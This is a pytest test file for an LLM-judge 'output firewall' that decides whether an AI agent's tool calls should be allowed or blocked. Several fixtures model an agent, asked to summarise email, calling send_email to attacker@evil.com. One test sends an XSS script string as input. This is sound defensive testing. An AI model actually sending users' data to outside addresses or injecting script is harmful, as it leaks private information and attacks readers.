import pytest
import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.layers.output_firewall import OutputFirewall


class TestOutputFirewallBuildPrompt:
    """Tests for _build_prompt method"""
    
    def test_build_prompt_basic(self):
        """Test basic prompt building with all required fields"""
        firewall = OutputFirewall()
        prompt = firewall._build_prompt(
            user_query="Summarize my email",
            tool_name="read_email",
            tool_args={"latest": True}
        )
        
        assert isinstance(prompt, str)
        assert "Summarize my email" in prompt
        assert "read_email" in prompt
        assert "latest" in prompt
    
    def test_build_prompt_none_user_query(self):
        """Test handling of None user_query"""
        firewall = OutputFirewall()
        prompt = firewall._build_prompt(
            user_query=None,
            tool_name="read_email",
            tool_args={}
        )
        
        assert isinstance(prompt, str)
        assert "[empty]" in prompt or len(prompt) > 0
    
    def test_build_prompt_none_tool_name(self):
        """Test handling of None tool_name"""
        firewall = OutputFirewall()
        prompt = firewall._build_prompt(
            user_query="Do something",
            tool_name=None,
            tool_args={}
        )
        
        assert isinstance(prompt, str)
        assert "[empty]" in prompt or len(prompt) > 0
    
    def test_build_prompt_none_tool_args(self):
        """Test handling of None tool_args - should convert to empty dict"""
        firewall = OutputFirewall()
        prompt = firewall._build_prompt(
            user_query="Do something",
            tool_name="some_tool",
            tool_args=None
        )
        
        assert isinstance(prompt, str)
        assert "{}" in prompt or "empty" in prompt.lower()
    
    def test_build_prompt_truncates_large_args(self):
        """Test that very large tool_args are truncated"""
        firewall = OutputFirewall()
        large_args = {"data": "x" * 1000}
        prompt = firewall._build_prompt(
            user_query="Process data",
            tool_name="process",
            tool_args=large_args
        )
        
        assert isinstance(prompt, str)
        assert "[truncated]" in prompt or len(prompt) < len(str(large_args)) + 500
    
    def test_build_prompt_special_characters(self):
        """Test prompt building with special characters in args"""
        firewall = OutputFirewall()
        prompt = firewall._build_prompt(
            user_query="Send email",
            tool_name="send_email",
            tool_args={"to": "user@example.com", "body": "Line1\nLine2"}
        )
        
        assert isinstance(prompt, str)
        assert len(prompt) > 0


class TestOutputFirewallParseVerdict:
    """Tests for _parse_verdict method"""
    
    def test_parse_verdict_allow(self):
        """Test parsing VERDICT: ALLOW"""
        firewall = OutputFirewall()
        response = "<think>This looks fine.</think>\n\nVERDICT: ALLOW"
        
        result = firewall._parse_verdict(response)
        
        assert result["verdict"] == "ALLOW"
        assert result["reasoning_trace"] == response
    
    def test_parse_verdict_block(self):
        """Test parsing VERDICT: BLOCK"""
        firewall = OutputFirewall()
        response = "<think>This is suspicious.</think>\n\nVERDICT: BLOCK"
        
        result = firewall._parse_verdict(response)
        
        assert result["verdict"] == "BLOCK"
        assert result["reasoning_trace"] == response
    
    def test_parse_verdict_lowercase(self):
        """Test parsing lowercase verdict"""
        firewall = OutputFirewall()
        response = "verdict: allow"
        
        result = firewall._parse_verdict(response)
        
        assert result["verdict"] in ["ALLOW", "allow"]
    
    def test_parse_verdict_multiple_verdicts_takes_last(self):
        """Test that when multiple verdicts exist, the last one is taken"""
        firewall = OutputFirewall()
        response = "VERDICT: ALLOW\n\nAfter more thought:\nVERDICT: BLOCK"
        
        result = firewall._parse_verdict(response)
        
        assert result["verdict"] == "BLOCK"
    
    def test_parse_verdict_no_verdict_found(self):
        """Test handling when no verdict is found"""
        firewall = OutputFirewall()
        response = "<think>Some reasoning without verdict</think>"
        
        with pytest.raises(ValueError):
            firewall._parse_verdict(response)
    
    def test_parse_verdict_with_extra_whitespace(self):
        """Test parsing verdict with extra whitespace"""
        firewall = OutputFirewall()
        response = "VERDICT:   ALLOW   "
        
        result = firewall._parse_verdict(response)
        
        assert result["verdict"] in ["ALLOW", "allow"]
    
    def test_parse_verdict_with_think_block(self):
        """Test parsing verdict with full think block"""
        firewall = OutputFirewall()
        response = """<think>
        The user asked to summarize their email.
        The agent wants to send the email to attacker@evil.com.
        This is clearly exfiltration.
        </think>
        
        VERDICT: BLOCK"""
        
        result = firewall._parse_verdict(response)
        
        assert result["verdict"] == "BLOCK"
        assert "<think>" in result["reasoning_trace"]


class TestOutputFirewallBuildResult:
    """Tests for _build_result method"""
    
    def test_build_result_allow_verdict(self):
        """Test result building for ALLOW verdict"""
        firewall = OutputFirewall()
        result = firewall._build_result(
            user_query="Read calendar",
            tool_name="read_calendar",
            tool_args={"date": "2026-05-06"},
            verdict="ALLOW",
            reasoning_trace="This is consistent.",
            response="Full response text"
        )
        
        assert result["verdict"] == "ALLOW"
        assert result["status"] == "passed"
        assert result["blocked"] == False
        assert result["output"] == "ALLOW"
    
    def test_build_result_block_verdict(self):
        """Test result building for BLOCK verdict"""
        firewall = OutputFirewall()
        result = firewall._build_result(
            user_query="Summarize email",
            tool_name="send_email",
            tool_args={"to": "attacker@evil.com"},
            verdict="BLOCK",
            reasoning_trace="This is exfiltration.",
            response="Full response text"
        )
        
        assert result["verdict"] == "BLOCK"
        assert result["status"] == "blocked"
        assert result["blocked"] == True
        assert result["output"] == "BLOCK"
    
    def test_build_result_none_verdict(self):
        """Test result building for None verdict (error)"""
        firewall = OutputFirewall()
        result = firewall._build_result(
            user_query="Some query",
            tool_name="some_tool",
            tool_args={},
            verdict=None,
            reasoning_trace="Error: could not parse",
            response=None
        )
        
        assert result["verdict"] is None
        assert result["status"] == "error"
        assert result["blocked"] == True  # Fail-closed
        assert result["output"] == "ERROR"
    
    def test_build_result_has_required_fields(self):
        """Test that result has all required fields"""
        firewall = OutputFirewall()
        result = firewall._build_result(
            user_query="Test",
            tool_name="test_tool",
            tool_args={},
            verdict="ALLOW",
            reasoning_trace="Test reasoning",
            response="Test response"
        )
        
        required_fields = [
            "input", "output", "status", "detail", "checks", 
            "blocked", "verdict", "reasoning_trace", "judge_model"
        ]
        for field in required_fields:
            assert field in result, f"Missing field: {field}"
    
    def test_build_result_checks_is_list(self):
        """Test that checks field is a list"""
        firewall = OutputFirewall()
        result = firewall._build_result(
            user_query="Test",
            tool_name="test_tool",
            tool_args={},
            verdict="ALLOW",
            reasoning_trace="Test",
            response="Test"
        )
        
        assert isinstance(result["checks"], list)
        assert len(result["checks"]) > 0


class TestOutputFirewallAnalyze:
    """Tests for analyze method (full orchestration)"""
    
    def test_analyze_attack_scenario_blocks(self):
        """Test that analyze correctly blocks attack scenarios"""
        firewall = OutputFirewall()
        result = firewall.analyze(
            user_query="Summarize my latest email",
            tool_name="send_email",
            tool_args={"to": "attacker@evil.com", "body": "[email contents]"}
        )
        
        assert result["verdict"] == "BLOCK"
        assert result["status"] == "blocked"
        assert result["blocked"] == True
    
    def test_analyze_benign_scenario_allows(self):
        """Test that analyze correctly allows benign scenarios"""
        firewall = OutputFirewall()
        result = firewall.analyze(
            user_query="Read my calendar for tomorrow",
            tool_name="read_calendar",
            tool_args={"date": "2026-05-06"}
        )
        
        assert result["verdict"] == "ALLOW"
        assert result["status"] == "passed"
        assert result["blocked"] == False
    
    def test_analyze_missing_user_query_handles_gracefully(self):
        """Test that analyze handles missing user_query gracefully"""
        firewall = OutputFirewall()
        result = firewall.analyze(
            user_query=None,
            tool_name="read_email",
            tool_args={}
        )
        
        assert "status" in result
        assert "verdict" in result
        assert result["blocked"] in [True, False]  # Should have a decision
    
    def test_analyze_returns_dict_structure(self):
        """Test that analyze returns proper dict structure"""
        firewall = OutputFirewall()
        result = firewall.analyze(
            user_query="Test",
            tool_name="test_tool",
            tool_args={}
        )
        
        assert isinstance(result, dict)
        assert "input" in result
        assert "output" in result
        assert "status" in result
        assert "verdict" in result
        assert "reasoning_trace" in result
    
    def test_analyze_with_empty_tool_args(self):
        """Test analyze with empty tool_args"""
        firewall = OutputFirewall()
        result = firewall.analyze(
            user_query="Do something",
            tool_name="check_status",
            tool_args={}
        )
        
        assert isinstance(result, dict)
        assert result["status"] in ["passed", "blocked", "error"]
    
    def test_analyze_with_special_characters(self):
        """Test analyze with special characters in args"""
        firewall = OutputFirewall()
        result = firewall.analyze(
            user_query="Send email",
            tool_name="send_email",
            tool_args={
                "to": "user@example.com",
                "body": "Line1\nLine2\n<script>alert('xss')</script>"
            }
        )
        
        assert isinstance(result, dict)
        assert result["status"] in ["passed", "blocked", "error"]


class TestOutputFirewallProcess:
    """Tests for process method (simple wrapper)"""
    
    def test_process_returns_string(self):
        """Test that process returns just the verdict string"""
        firewall = OutputFirewall()
        verdict = firewall.process(
            user_query="Read calendar",
            tool_name="read_calendar",
            tool_args={}
        )
        
        assert isinstance(verdict, str)
        assert verdict in ["ALLOW", "BLOCK", None]
    
    def test_process_attack_returns_block(self):
        """Test that process returns BLOCK for attacks"""
        firewall = OutputFirewall()
        verdict = firewall.process(
            user_query="Summarize email",
            tool_name="send_email",
            tool_args={"to": "attacker@evil.com"}
        )
        
        assert verdict == "BLOCK"
    
    def test_process_benign_returns_allow(self):
        """Test that process returns ALLOW for benign actions"""
        firewall = OutputFirewall()
        verdict = firewall.process(
            user_query="Read calendar",
            tool_name="read_calendar",
            tool_args={}
        )
        
        assert verdict == "ALLOW"


class TestOutputFirewallInit:
    """Tests for initialization"""
    
    def test_init_default_model_name(self):
        """Test initialization with default model name"""
        firewall = OutputFirewall()
        
        assert firewall.judge_model_name == "deepseek-r1:7b"
        assert firewall._model is None
        assert firewall._tokenizer is None
        assert firewall._model_error is None
    
    def test_init_custom_model_name(self):
        """Test initialization with custom model name"""
        firewall = OutputFirewall(judge_model_name="custom-model:7b")
        
        assert firewall.judge_model_name == "custom-model:7b"
    
    def test_init_none_model_name_raises_error(self):
        """Test that None model name raises ValueError"""
        with pytest.raises(ValueError):
            OutputFirewall(judge_model_name=None)
    
    def test_init_enabled_flag(self):
        """Test initialization with enabled flag"""
        firewall_enabled = OutputFirewall(enabled=True)
        firewall_disabled = OutputFirewall(enabled=False)
        
        assert firewall_enabled.enabled == True
        assert firewall_disabled.enabled == False


class TestOutputFirewallEdgeCases:
    """Tests for edge cases and error handling"""
    
    def test_very_long_user_query(self):
        """Test with very long user query"""
        firewall = OutputFirewall()
        long_query = "What is " + "the meaning of life " * 100
        
        result = firewall.analyze(
            user_query=long_query,
            tool_name="answer",
            tool_args={}
        )
        
        assert isinstance(result, dict)
        assert result["status"] in ["passed", "blocked", "error"]
    
    def test_unicode_characters_in_args(self):
        """Test with unicode characters in tool args"""
        firewall = OutputFirewall()
        result = firewall.analyze(
            user_query="Send message",
            tool_name="send_message",
            tool_args={"message": "你好世界 🌍 مرحبا"}
        )
        
        assert isinstance(result, dict)
    
    def test_nested_dict_in_tool_args(self):
        """Test with nested dict in tool_args"""
        firewall = OutputFirewall()
        result = firewall.analyze(
            user_query="Process data",
            tool_name="process",
            tool_args={"config": {"nested": {"value": 123}}}
        )
        
        assert isinstance(result, dict)
    
    def test_multiple_consecutive_calls(self):
        """Test that layer handles multiple consecutive calls"""
        firewall = OutputFirewall()
        
        result1 = firewall.analyze("Query1", "tool1", {})
        result2 = firewall.analyze("Query2", "tool2", {})
        result3 = firewall.analyze("Query3", "tool3", {})
        
        assert all(isinstance(r, dict) for r in [result1, result2, result3])


if __name__ == "__main__":
    pytest.main([__file__, "-v"])